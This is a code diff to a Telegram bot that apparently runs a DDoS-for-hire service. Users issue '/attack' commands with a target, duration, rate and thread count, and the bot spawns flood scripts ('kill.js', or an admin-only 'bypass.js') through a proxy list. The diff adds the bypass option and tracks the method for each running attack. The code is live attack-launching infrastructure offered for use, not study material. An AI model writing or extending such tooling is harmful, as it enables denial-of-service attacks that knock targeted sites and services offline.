@@ -50,12 +50,12 @@ bot.on('message', (msg) => {
 
   if (text.startsWith('/attack')) {
     const args = text.split(/\s+/).slice(1)
-    if (args.length !== 4) {
-      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: "/attack [target] [time] [rate] [thread]" }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+    if (args.length < 4 || args.length > 5) {
+      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: "/attack [target] [time] [rate] [thread] [methods](optional, bypass for admins)" }, null, 2) + '\n```', { parse_mode: 'Markdown' })
       return
     }
 
-    const [target, timeStr, rate, thread] = args
+    const [target, timeStr, rate, thread, methods] = args
     const time = parseInt(timeStr)
 
     if (!target || isNaN(time) || isNaN(parseInt(rate)) || isNaN(parseInt(thread))) {
@@ -68,9 +68,15 @@ bot.on('message', (msg) => {
       return
     }
 
-    const cmd = spawn('node', ['./kill.js', target, time, rate, thread, './prx.txt'])
+    if (methods && methods.toLowerCase() === 'bypass' && !isAdmin) {
+      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: "Bypass method is admin-only" }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+      return
+    }
+
+    const script = (isAdmin && methods?.toLowerCase() === 'bypass') ? './bypass.js' : './kill.js'
+    const cmd = spawn('node', [script, target, time, rate, thread, './prx.txt'])
     const attackId = `${userId}_${Date.now()}`
-    activeAttacks[attackId] = { cmd, target, time, rate, thread, userId }
+    activeAttacks[attackId] = { cmd, target, time, rate, thread, userId, methods }
 
     const response = {
       status: "Attack Started!",
@@ -78,6 +84,7 @@ bot.on('message', (msg) => {
       time,
       rate,
       thread,
+      methods: methods || 'default',
       caller: username,
       index: attackId
     }
@@ -115,7 +122,8 @@ bot.on('message', (msg) => {
         target: v.target,
         time: v.time,
         rate: v.rate,
-        thread: v.thread
+        thread: v.thread,
+        methods: v.methods || 'kill'
       }))
     bot.sendMessage(id, '```json\n' + JSON.stringify(list, null, 2) + '\n```', { parse_mode: 'Markdown' })
   }
